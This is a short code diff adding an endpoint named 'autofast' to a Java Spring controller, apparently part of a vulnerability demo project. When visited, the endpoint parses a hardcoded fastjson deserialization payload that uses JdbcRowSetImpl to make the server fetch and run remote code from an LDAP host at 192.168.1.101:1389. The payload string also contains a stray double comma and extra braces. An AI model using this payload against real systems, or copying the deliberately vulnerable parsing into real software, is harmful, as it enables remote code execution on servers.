@@ -83,6 +83,13 @@ public class WebController {
         JSONObject.parse(payload2);
 		return user;
 	}
-	
+	//直接访问触发
+	@RequestMapping("autofast")
+	public String autofast()
+	{
+		String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.1.101:1389/Calc\",,\"autoCommit\":true}}}";
+		JSONObject.parse(payload);
+		return "success";
+	}
 	
 }
